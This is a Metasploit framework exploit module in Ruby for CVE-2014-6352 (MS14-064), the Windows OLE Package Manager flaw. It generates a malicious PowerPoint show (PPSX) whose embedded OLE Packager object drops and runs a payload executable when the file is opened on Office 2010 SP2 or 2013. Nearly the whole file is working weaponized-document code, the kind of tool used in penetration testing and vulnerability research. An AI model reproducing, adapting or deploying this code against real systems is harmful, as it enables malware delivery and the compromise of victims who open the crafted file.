##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS14-064 Microsoft Windows OLE Package Manager Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE)
        allowing arbitrary code execution, publicly exploited in the wild as MS14-060 patch bypass.
        The Microsoft update tried to fix the vulnerability publicly known as "Sandworm". Platforms
        such as Windows Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known
        to be vulnerable. However, based on our testing, the most reliable setup is on Windows
        platforms running Office 2013 and Office 2010 SP2. And please keep in mind that some other
        setups such as using Office 2010 SP1 might be less stable, and sometimes may end up with a
        crash due to a failure in the CPackage::CreateTempFileName function.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Haifei Li', # Vulnerability discovery
          'sinn3r', # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-6352'],
          ['MSB', 'MS14-064'],
          ['BID', '70690'],
          ['URL', 'http://blogs.mcafee.com/mcafee-labs/bypassing-microsofts-patch-sandworm-zero-day-even-editing-dangerous']
        ],
      'Payload'        =>
        {
          'Space'       => 2048,
          'DisableNops' => true
        },
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          ['Windows 7 SP1 / Office 2010 SP2 / Office 2013', {}],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Oct 21 2014",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [true, 'The PPSX file', 'msf.ppsx'])
      ], self.class)
  end

  def exploit
    print_status("Creating '#{datastore['FILENAME']}' file ...")
    ole_stream = ole_packager
    zip = zip_ppsx(ole_stream)
    file_create(zip)
  end

  def zip_ppsx(ole_stream)
    zip_data = {}
    data_dir = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-6352', 'template_run_as_admin')

    Dir["#{data_dir}/**/**"].each do |file|
      unless File.directory?(file)
        zip_data[file.sub(data_dir,'')] = File.read(file)
      end
    end

    # add the otherwise skipped "hidden" file
    file = "#{data_dir}/_rels/.rels"
    zip_data[file.sub(data_dir,'')] = File.read(file)

    # put our own OLE streams
    zip_data['/ppt/embeddings/oleObject1.bin'] = ole_stream

    # create the ppsx
    ppsx = Rex::Zip::Archive.new
    zip_data.each_pair do |k,v|
      ppsx.add_file(k,v)
    end

    ppsx.pack
  end

  def ole_packager
    payload_name = "#{rand_text_alpha(4)}.exe"

    file_info = [2].pack('v')
    file_info << "#{payload_name}\x00"
    file_info << "#{payload_name}\x00"
    file_info << "\x00\x00"

    extract_info = [3].pack('v')
    extract_info << [payload_name.length + 1].pack('V')
    extract_info << "#{payload_name}\x00"

    p = generate_payload_exe
    file = [p.length].pack('V')
    file << p

    append_info = [payload_name.length].pack('V')
    append_info << Rex::Text.to_unicode(payload_name)
    append_info << [payload_name.length].pack('V')
    append_info << Rex::Text.to_unicode(payload_name)
    append_info << [payload_name.length].pack('V')
    append_info << Rex::Text.to_unicode(payload_name)

    ole_data = file_info + extract_info + file + append_info
    ole_contents = [ole_data.length].pack('V') + ole_data

    ole = create_ole("\x01OLE10Native", ole_contents)

    ole
  end

  def create_ole(stream_name, data)
    ole_tmp = Rex::Quickfile.new('ole')
    stg = Rex::OLE::Storage.new(ole_tmp.path, Rex::OLE::STGM_WRITE)

    stm = stg.create_stream(stream_name)
    stm << data
    stm.close

    directory = stg.instance_variable_get(:@directory)
    directory.each_entry do |entry|
      if entry.instance_variable_get(:@_ab) == 'Root Entry'
        # 0003000C-0000-0000-c000-000000000046 # Packager
        clsid = Rex::OLE::CLSID.new("\x0c\x00\x03\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46")
        entry.instance_variable_set(:@_clsId, clsid)
      end
    end

    # write to disk
    stg.close

    ole_contents = File.read(ole_tmp.path)
    ole_tmp.close
    ole_tmp.unlink

    ole_contents
  end
end


